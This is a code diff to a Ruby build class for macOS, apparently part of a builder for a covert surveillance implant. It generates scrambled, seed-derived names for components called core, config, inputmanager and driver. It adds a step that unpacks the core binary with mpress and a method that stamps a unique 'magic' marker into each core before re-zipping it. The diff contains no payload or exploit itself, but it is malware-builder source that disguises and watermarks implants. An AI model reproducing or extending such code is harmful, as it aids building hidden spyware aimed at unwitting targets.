@@ -44,6 +44,8 @@ class BuildOSX < Build
         raise "Working method marker not found"
       end
     end
+    
+    CrossPlatform.exec path('mpress'), "-ub " + path(params[:core])
 
   end
 
@@ -52,7 +54,7 @@ class BuildOSX < Build
 
     core = scramble_name(@factory.seed, 3)
     core_backup = scramble_name(core, 32)
-    dir = scramble_name(core[0..7], 7) + '.app'
+    dir = scramble_name(core[0..7], 7)
     config = scramble_name(core[0] < core_backup[0] ? core : core_backup, 1)
     inputmanager = scramble_name(config, 2)
     driver = scramble_name(config, 4)
@@ -151,6 +153,18 @@ class BuildOSX < Build
     # this is the only file we need to output after this point
     @outputs = ['output.zip']
 
+  end
+
+  def unique(core)
+    Zip::ZipFile.open(core) do |z|
+      core_content = z.file.open('core', "rb") { |f| f.read }
+      add_magic(core_content)
+      File.open(Config.instance.temp('core'), "wb") {|f| f.write core_content}
+    end
+
+    # update with the zip utility since rubyzip corrupts zip file made by winzip or 7zip
+    CrossPlatform.exec "zip", "-j -u #{core} #{Config.instance.temp('core')}"
+    FileUtils.rm_rf Config.instance.temp('core')
   end
 
 end
